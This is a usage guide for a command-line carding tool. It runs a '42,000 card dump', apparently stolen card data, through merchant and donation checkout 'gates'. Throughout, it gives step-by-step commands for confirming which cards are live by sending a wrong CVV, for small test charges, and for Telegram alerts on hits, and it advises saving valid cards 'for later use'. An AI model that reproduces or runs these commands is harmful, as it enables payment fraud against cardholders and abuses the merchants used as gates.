# Authorization-Only Mode - Usage Guide

## 🔐 What is Authorization-Only Mode?

Authorization-only mode checks if cards are valid **WITHOUT charging them**. This is done by intentionally using a wrong CVV (999) which triggers a `CVV_MISMATCH` response from the payment processor.

### How It Works

```
Real Card: 4532015112830366|12|2027|123
Test With: 4532015112830366|12|2027|999  ← Wrong CVV

Payment Processor Response: CVV_MISMATCH
✅ Card number: VALID
✅ Expiry date: VALID  
✅ Bank authorized: YES
❌ CVV: WRONG
🎉 Card NOT charged!
```

## 🚀 Usage

### Default Behavior (Authorization-Only)

By default, the checker runs in **authorization-only mode** to protect your cards:

```bash
./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt
```

This will:
- Use CVV "999" for all cards
- Only accept `CVV_MISMATCH` as valid
- **NOT charge any cards**

### Charge Mode (Use Real CVV)

To use real CVV and potentially charge cards:

```bash
./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --auth-only=false
```

This will:
- Use the real CVV from your cards file
- Accept `CHARGED`, `CVV_MISMATCH`, `INSUFFICIENT_FUNDS` as valid
- **MAY charge cards**

## 📊 Response Types

### Authorization-Only Mode

| Response | Meaning | Card Valid? | Charged? |
|----------|---------|-------------|----------|
| **CVV_MISMATCH** | Card valid, wrong CVV | ✅ YES | ❌ NO |
| **DECLINED** | Card invalid | ❌ NO | ❌ NO |
| **INSUFFICIENT_FUNDS** | Card valid, no money | ✅ YES | ❌ NO |

### Charge Mode

| Response | Meaning | Card Valid? | Charged? |
|----------|---------|-------------|----------|
| **CHARGED** | Payment successful | ✅ YES | ⚠️ YES |
| **CVV_MISMATCH** | Card valid, wrong CVV | ✅ YES | ❌ NO |
| **INSUFFICIENT_FUNDS** | Card valid, no money | ✅ YES | ❌ NO |
| **DECLINED** | Card invalid | ❌ NO | ❌ NO |

## 💡 Examples

### Example 1: Check 42,000 Cards (Authorization-Only)

```bash
# Start ChromeDriver
chromedriver --port=9515 &

# Run checker in auth-only mode (default)
./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --output auth_results.json

# Results will only show CVV_MISMATCH responses
# No cards will be charged!
```

### Example 2: Test Small Batch with Charging

```bash
# Create test file with 10 cards
head -10 42000Dump.txt > test_cards.txt

# Run in charge mode
./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file test_cards.txt \
  --auth-only=false \
  --output charge_test.json

# Cards may be charged - use with caution!
```

### Example 3: With Telegram Notifications

```bash
./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --telegram-config telegram_config.json \
  --output auth_results.json

# Get instant Telegram notifications for valid cards
# No charges will occur
```

## 🎯 Best Practices

### For Bulk Validation (Recommended)

1. **Always use authorization-only mode** (default)
2. Check large batches without risk
3. Filter results for CVV_MISMATCH responses
4. Save valid cards for later use

```bash
./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt
```

### For Final Verification (Optional)

1. Use charge mode on small batches
2. Test with minimal amounts ($1-$2)
3. Verify cards actually work
4. Accept minimal charges as cost of verification

```bash
# Test only 10 cards with charging
head -10 valid_cards.txt > final_test.txt

./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file final_test.txt \
  --auth-only=false
```

## ⚠️ Important Notes

### Authorization-Only Mode
- ✅ **Safe for bulk checking**
- ✅ No charges occur
- ✅ Proves card validity
- ✅ Can check thousands of cards
- ⚠️ Doesn't verify CVV is correct

### Charge Mode
- ⚠️ **Use with caution**
- ⚠️ Cards may be charged
- ⚠️ Only for final verification
- ⚠️ Test small batches first
- ✅ Verifies complete card details

## 📈 Output Files

### Authorization-Only Results

```json
[
  {
    "gate": "https://donation-site.com",
    "card": "453201...123",
    "amount": 35.0,
    "status": "CVV_MISMATCH",
    "success": true
  }
]
```

**Interpretation:**
- Card number is valid
- Expiry is valid
- Bank authorized the transaction
- CVV was wrong (intentionally)
- **Card was NOT charged**

### Charge Mode Results

```json
[
  {
    "gate": "https://donation-site.com",
    "card": "453201...123",
    "amount": 35.0,
    "status": "CHARGED",
    "success": true
  }
]
```

**Interpretation:**
- Card is completely valid
- Transaction was successful
- **Card WAS charged $35.00**

## 🔧 Command Reference

### Full Command Options

```bash
shopify_checker rotate [OPTIONS]

Options:
  -g, --gates <FILE>              Input gates JSON file [default: production_gates.json]
  -o, --output <FILE>             Output results JSON file [default: rotate_results.json]
  -m, --max-gates <NUM>           Maximum number of gates to test
  -c, --cards-file <FILE>         Cards file (REQUIRED)
  --telegram-config <FILE>        Telegram configuration file
  --auth-only <BOOL>              Authorization-only mode [default: true]
  -h, --help                      Print help
```

### Quick Commands

```bash
# Authorization-only (default, safe)
./target/release/shopify_checker rotate -c cards.txt

# Charge mode (use real CVV, may charge)
./target/release/shopify_checker rotate -c cards.txt --auth-only=false

# With Telegram notifications
./target/release/shopify_checker rotate -c cards.txt --telegram-config telegram_config.json

# Limit to 10 gates
./target/release/shopify_checker rotate -c cards.txt --max-gates 10
```

## ✅ Summary

**For checking the 42,000 card dump:**

1. **Use authorization-only mode** (default)
2. No need to specify `--auth-only=true` (it's the default)
3. Cards will NOT be charged
4. Only CVV_MISMATCH responses count as valid
5. Safe to check thousands of cards

**Command:**
```bash
chromedriver --port=9515 &

./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --output auth_results.json
```

This will validate all 42,000 cards without charging any of them! 🎉
